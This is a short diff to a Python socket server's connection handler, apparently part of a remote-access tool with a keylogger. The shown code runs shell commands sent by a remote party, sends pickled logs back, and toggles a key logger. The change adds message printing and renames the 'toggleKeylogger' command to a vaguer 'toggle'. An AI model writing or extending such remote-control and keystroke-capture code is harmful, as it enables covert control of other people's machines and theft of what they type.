@@ -105,6 +105,7 @@ def handleConnection(conn: socket, addr):
                 connected = False
                 break
             else:
+                print(msg)
                 if msg[:3] == "cmd":
                     print(f"Remote system running command: {msg[3:]}")
                     output = subprocess.getoutput(msg[3:])
@@ -137,8 +138,7 @@ def handleConnection(conn: socket, addr):
                     msg_length += b" " * (HEADER - len(msg_length))
                     conn.send(msg_length)
                     conn.send(pickledLogs)
-
-                elif msg == "toggleKeylogger":
+                elif msg == "toggle":
                     toggleLogger()
 
 
